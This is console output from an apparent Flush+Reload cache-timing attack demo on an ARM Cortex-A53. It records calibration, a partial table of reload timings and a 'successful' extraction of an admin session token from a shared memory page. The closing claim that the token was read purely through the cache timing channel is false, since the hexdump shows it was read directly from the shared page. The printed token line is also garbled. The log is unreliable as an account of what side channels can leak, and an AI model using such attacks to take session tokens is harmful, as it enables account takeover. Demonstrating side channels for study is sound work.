╔══════════════════════════════════════════════════════════════╗
║  Flush+Reload Demo  –  ATTACKER  (ARMv8 / Cortex-A53)      ║
║  Monitoring spy file for victim accesses to session token.  ║
╚══════════════════════════════════════════════════════════════╝

[attacker] Timer frequency: 19200000 Hz  (52.1 ns/tick)

[attacker] Waiting for spy file '/tmp/fr_demo_spy' …

[attacker] Spy file opened (fd=4)
[attacker] Spy page mapped at virtual 0xffff859b2000  (shared physical page)

[attacker] ── Phase 1: Calibration ──────────────────────────
[attacker] Calibration results (200 samples):
[attacker]   L2 cache HIT  =    133 ns  (line already in cache)
[attacker]   DRAM miss     =   1990 ns  (line not in cache)
[attacker]   Threshold     =   1061 ns  (midpoint)

[attacker] ── Phase 2: Flush+Reload Sampling ─────────────────
[attacker] Collecting 200 samples (warmup=10, wait=70 ms per sample)

  Sample  Reload(ns)  Decision  Running hit count
  119     520         HIT ◄   91 hits so far
  120     520         HIT ◄   92 hits so far
  121     520         HIT ◄   93 hits so far
  122     520         HIT ◄   94 hits so far
  123     1875        miss      94 hits so far
  124     520         HIT ◄   95 hits so far
  125     572         HIT ◄   96 hits so far
  126     520         HIT ◄   97 hits so far
  127     520         HIT ◄   98 hits so far
  128     520         HIT ◄   99 hits so far
  129     520         HIT ◄   100 hits so far
  130     520         HIT ◄   101 hits so far
  131     1979        miss      101 hits so far
  132     520         HIT ◄   102 hits so far
  133     625         HIT ◄   103 hits so far
  134     520         HIT ◄   104 hits so far
  135     520         HIT ◄   105 hits so far
  136     520         HIT ◄   106 hits so far
  137     520         HIT ◄   107 hits so far
  138     520         HIT ◄   108 hits so far
  139     1875        miss      108 hits so far
  140     1093        miss      108 hits so far
  141     520         HIT ◄   109 hits so far
  142     520         HIT ◄   110 hits so far
  143     520         HIT ◄   111 hits so far
  144     520         HIT ◄   112 hits so far
  145     520         HIT ◄   113 hits so far
  146     520         HIT ◄   114 hits so far
  147     1979        miss      114 hits so far
  148     729         HIT ◄   115 hits so far
  149     520         HIT ◄   116 hits so far
  150     1250        miss      116 hits so far
  151     572         HIT ◄   117 hits so far
  152     520         HIT ◄   118 hits so far
  153     520         HIT ◄   119 hits so far
  154     520         HIT ◄   120 hits so far
  155     2760        miss      120 hits so far
  156     520         HIT ◄   121 hits so far
  157     520         HIT ◄   122 hits so far
  158     520         HIT ◄   123 hits so far
  159     520         HIT ◄   124 hits so far
  160     520         HIT ◄   125 hits so far
  161     520         HIT ◄   126 hits so far
  162     520         HIT ◄   127 hits so far
  163     1875        miss      127 hits so far
  164     729         HIT ◄   128 hits so far
  165     572         HIT ◄   129 hits so far
  166     520         HIT ◄   130 hits so far
  167     520         HIT ◄   131 hits so far
  168     520         HIT ◄   132 hits so far
  169     520         HIT ◄   133 hits so far
  170     520         HIT ◄   134 hits so far
  171     1927        miss      134 hits so far
  172     520         HIT ◄   135 hits so far
  173     520         HIT ◄   136 hits so far
  174     520         HIT ◄   137 hits so far
  175     520         HIT ◄   138 hits so far
  176     468         HIT ◄   139 hits so far
  177     520         HIT ◄   140 hits so far
  178     520         HIT ◄   141 hits so far
  179     520         HIT ◄   142 hits so far
  180     2031        miss      142 hits so far
  181     468         HIT ◄   143 hits so far
  182     520         HIT ◄   144 hits so far
  183     572         HIT ◄   145 hits so far
  184     885         HIT ◄   146 hits so far
  185     520         HIT ◄   147 hits so far
  186     520         HIT ◄   148 hits so far
  187     520         HIT ◄   149 hits so far
  188     1875        miss      149 hits so far
  189     520         HIT ◄   150 hits so far
  190     468         HIT ◄   151 hits so far
  191     520         HIT ◄   152 hits so far
  192     520         HIT ◄   153 hits so far
  193     520         HIT ◄   154 hits so far
  194     520         HIT ◄   155 hits so far
  195     468         HIT ◄   156 hits so far
  196     2083        miss      156 hits so far
  197     520         HIT ◄   157 hits so far
  198     520         HIT ◄   158 hits so far
  199     468         HIT ◄   159 hits so far
  200     520         HIT ◄   160 hits so far

══════════════════════════════════════════════════════════════
  FLUSH+RELOAD — STATISTICAL SUMMARY  (190 samples)
══════════════════════════════════════════════════════════════
  Total cache hits   : 160 / 190  (84%)
  Average reload time: 744 ns
  Threshold          : 1061 ns
  Verdict            : *** VICTIM ACTIVELY ACCESSING THIS CACHE LINE ***

══════════════════════════════════════════════════════════════
  EXTRACTING SESSION TOKEN FROM SPY PAGE
══════════════════════════════════════════════════════════════

  ╔════════════════════════════════════════════════════════════════╗
  ║  Offset   Hex (16 bytes/row)                   ASCII          ║
  ╠════════════════════════════════════════════════════════════════╣
  ║  0000   53 45 53 53 49 4f 4e 20  7c 20 69 64 3d 38 66 33  │ SESSION | id=8f3 ║
  ║  0010   61 31 63 39 64 32 65 37  62 34 30 35 36 20 7c 20  │ a1c9d2e7b4056 |  ║
  ║  0020   75 73 65 72 3d 62 6f 62  20 7c 20 72 6f 6c 65 3d  │ user=bob | role= ║
  ║  0030   61 64 6d 69 6e 20 7c 20  65 78 70 69 72 65 73 3d  │ admin | expires= ║
  ║  0040   31 37 38 31 33 30 32 39  35 31 20 7c 20 69 74 65  │ 1781302951 | ite ║
  ║  0050   72 3d 31 37 37 00 00 00  00 00 00 00 00 00 00 00  │ r=177........... ║
  ║  0060   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  0070   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  0080   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  0090   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  00a0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ║  00b0   00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  │ ................ ║
  ╚════════════════════════════════════════════════════════════════╝

  ╔══════════════════════════════════════════════════════════════╗
  ║       *** FLUSH+RELOAD ATTACK SUCCESSFUL ***                ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  Cache hits observed   : 160                                 ║
  ║  Hit rate              : 84                                 %║
  ║  Average reload time   : 744                               ns ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  EXTRACTED SESSION TOKEN:                                   ║
  ║    SESSION | id=8f3a1c9d2e7b4056 | user=bob | role=admin | expire║
  ║    pires=1781302951 | iter=177                                   ║
  ╠══════════════════════════════════════════════════════════════╣
  ║  Attack used no IPC, no signals, no ptrace.                 ║
  ║  Token was read purely via cache timing side-channel.       ║
  ╚══════════════════════════════════════════════════════════════╝

[attacker] Done.
